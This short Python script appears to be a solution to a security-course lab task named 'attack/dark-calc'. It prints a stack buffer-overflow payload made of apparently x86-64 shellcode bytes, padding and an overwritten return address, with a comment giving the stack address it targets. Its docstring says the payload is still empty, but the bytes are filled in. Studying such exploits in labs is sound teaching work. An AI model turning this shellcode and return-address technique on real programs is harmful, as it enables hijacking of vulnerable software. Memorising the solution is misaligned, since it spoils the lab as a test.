#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = b"\x31\xFF\x40\xB7\x04\x31\xDB\x66\xBB\x87\x1A\x0F\xBA\xEB\x16\xFF\xE3ABCDEFG\xd0\x0f\x80\x00\x10\x72\x00"

# absolute stack pos of the beginning of the string: $rsp = 0x0000721000800fd0

sys.stdout.buffer.write(payload)
